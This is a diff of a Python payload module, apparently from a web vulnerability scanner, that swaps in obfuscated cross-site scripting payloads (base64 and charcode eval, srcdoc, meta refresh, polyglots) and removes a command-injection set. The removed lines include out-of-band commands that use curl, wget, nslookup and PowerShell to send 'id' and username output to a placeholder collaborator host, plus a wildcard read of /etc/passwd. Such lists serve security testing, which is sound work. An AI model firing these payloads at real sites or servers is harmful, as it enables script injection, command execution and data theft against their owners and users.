@@ -44,85 +44,29 @@ SQLI_PAYLOADS = {
 
 # --- Cross-Site Scripting (XSS) Payloads ---
 XSS_PAYLOADS = {
-    "basic_reflection": [
-        "<script>alert(1)</script>",
-        "<img src=x onerror=alert(1)>",
-        "<svg onload=alert(1)>",
-        "'\" autofocus onfocus=alert(1)>", # Attribute injection
-        "<details open ontoggle=alert(1)>", # HTML5 based
-        "javascript:alert(1)", # For href/src attributes
-    ],
-    "html_injection": [
-        "<h1>XSS</h1>", # Simple tag injection
-        "<a href=//example.com>Click Me</a>", # Link injection
-        "<plaintext>", # Breaks HTML parsing
-    ],
     "attribute_injection": [
-        "\" onmouseover=alert(1) \"",
-        "' onerror=alert(1) '",
-        "\" style=display:block;font-size:50px; onmouseover=alert(1)//", # CSS Breakout
+        "\" onfocus=eval(atob('YWxlcnQoMSk=')) autofocus tabindex=0 \"", # Base64 Eval in Attribute
+        "\" style=animation:1s;animation-name:x; onanimationend=alert(1) \"", # CSS Animation Trigger
+        "\" accesskey=x onclick=alert(1) \"", # Accesskey Abuse
     ],
     "filter_evasion": [
-        "<scr<script>ipt>alert(1)</scr<script>ipt>", # Tag splitting
-        "<img src=x oNeRrOr=alert(1)>", # Case variation
-        "<svg/onload=&#97&#108&#101&#114&#116(1)>", # HTML Entities
-        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>", # Base64 eval
-        "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", # Charcode eval
-        "data:text/html,<script>alert(1)</script>", # Data URI
-        "<a href=\"javas&#99;ript:alert(1)\">XSS</a>", # Partial entity
+        "<svg><script>alert&#x28;1&#x29;</script></svg>", # HTML Entities Obfuscation
+        "<img src=x onerror=Function('ale'+'rt(1)')()>", # String Concatenation
+        "<meta content=\"1;javascript:alert(1)\" http-equiv=\"refresh\">", # Meta Refresh Trick
+        "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", # Base64 Data URI
+        "<iframe srcdoc=\"<svg onload=alert(1)>\"></iframe>", # Srcdoc Injection
     ],
     "dom_based": [
-        "#\"><img src=x onerror=alert(1)>", # Hash based injection target
-        "javascript:window.location.hash='<img src=x onerror=alert(1)>'", # Triggering via hash change
-        "eval(location.hash.slice(1))", # Needs sink in code
-        "document.write(location.hash.slice(1))", # Needs sink in code
+        "javascript:void(document.documentElement.innerHTML='<img src=x onerror=alert(1)>')", # DOM Rewrite
+        "javascript:window.name='alert(1)';eval(window.name)", # Window Name Abuse
+        "data:,eval(atob(location.hash.slice(1)))#YWxlcnQoMSk=", # Data URI with Hash
     ],
-    "framework_specific": { # Often needs specific sinks
-        "angular": ["{{constructor.constructor('alert(1)')()}}"],
-        "vue": ["<div v-html=\"'<img src=x onerror=alert(1)>'\"></div>"],
-        "react": ["<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>"], # Needs specific prop usage
-    },
-    "polyglots": [ # Attempts to work in multiple contexts
-        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
-        "-->'><svg/onload=alert(1)>",
-        "\"'--></style></script><svg onload=alert(1)>",
-        "'\"()><svg onload=alert(1)>",
+    "polyglots": [
+        "javascript:/*--></title></style></textarea><svg/onload=Function('ale'+'rt(1)')()>", # Multi-Context with Concat
+        "\"'><svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>", # Charcode Eval
+        "data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+", # Base64 Polyglot
     ]
 }
-
-# --- Command Injection Payloads ---
-CMD_PAYLOADS = {
-    "basic": [
-        "; id", "& id", "| id", "&& id", "|| id", "`id`", "$(id)", # Linux/Unix
-        "; whoami", "& whoami", "| whoami", "&& whoami", "|| whoami", # Linux/Unix
-        "; dir", "& dir", "| dir", "&& dir", "|| dir", # Windows
-        "; systeminfo", "& systeminfo", "| systeminfo", # Windows
-    ],
-    "blind_time": [
-        "; sleep SLEEP_TIME", "& sleep SLEEP_TIME", "| sleep SLEEP_TIME", # Linux/Unix
-        "& timeout /t SLEEP_TIME", "; timeout /t SLEEP_TIME", # Windows
-        "$(sleep SLEEP_TIME)", "`sleep SLEEP_TIME`", # Command Substitution Linux
-        "; ping -c SLEEP_TIME 127.0.0.1", # Linux Ping delay
-        "& ping -n SLEEP_TIME 127.0.0.1 > NUL", # Windows Ping delay
-    ],
-    "oob": [ # Out-of-Band
-        "; nslookup `whoami`.INTERACTSH_URL", # Linux DNS
-        "& nslookup %USERNAME%.INTERACTSH_URL", # Windows DNS
-        "; curl http://INTERACTSH_URL/`whoami`", # Linux HTTP
-        "& powershell -Command \"(New-Object System.Net.WebClient).DownloadString('http://INTERACTSH_URL/'+$env:username)\"", # Windows PowerShell HTTP
-        "| wget -O- --post-data=\"output=$(id | base64)\" http://INTERACTSH_URL/", # Linux Post Data
-        "$(dig +short INTERACTSH_URL)", # Linux Dig DNS
-    ],
-    "filter_evasion": [
-        ";${IFS}id", # Internal Field Separator Linux
-        "; w`whoami`", # Nested backticks Linux
-        "& C:\\Windows\\System32\\cmd.exe /c whoami", # Full Path Windows
-        "; cat /e?c/p?sswd", # Wildcards Linux
-        "& type C:\\Windows\\win.ini", # Alternative read command Windows
-        "; exec('id')", # Using syscalls/alternatives (context dependent)
-    ]
-}
-
 # --- Server-Side Template Injection (SSTI) Payloads ---
 SSTI_PAYLOADS = {
     "basic_detection": [
